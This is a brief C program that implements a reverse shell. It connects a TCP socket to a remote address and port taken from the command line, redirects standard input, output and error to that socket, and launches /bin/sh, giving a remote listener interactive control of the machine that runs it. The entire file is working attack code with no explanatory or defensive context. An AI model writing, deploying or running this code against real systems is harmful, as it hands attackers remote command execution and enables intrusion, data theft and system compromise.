#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>

int main(int argc, char *argv[]) {
    struct sockaddr_in sa;
    int s, ret;

    if (argc != 3) {
        printf("Usage:%s REMOTE_ADDR REMOTE_PORT\n", argv[0]);
        return -1;
    }

    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(argv[1]);
    sa.sin_port = htons(atol(argv[2]));

    s = socket(AF_INET, SOCK_STREAM, 0);
    ret = connect(s, (struct sockaddr *)&sa, sizeof(sa));
    //printf("ret:%d, errno:%d\n", errno);
    dup2(s, 0);
    dup2(s, 1);
    dup2(s, 2);

    execve("/bin/sh", 0, 0);
    
    return 0;
}
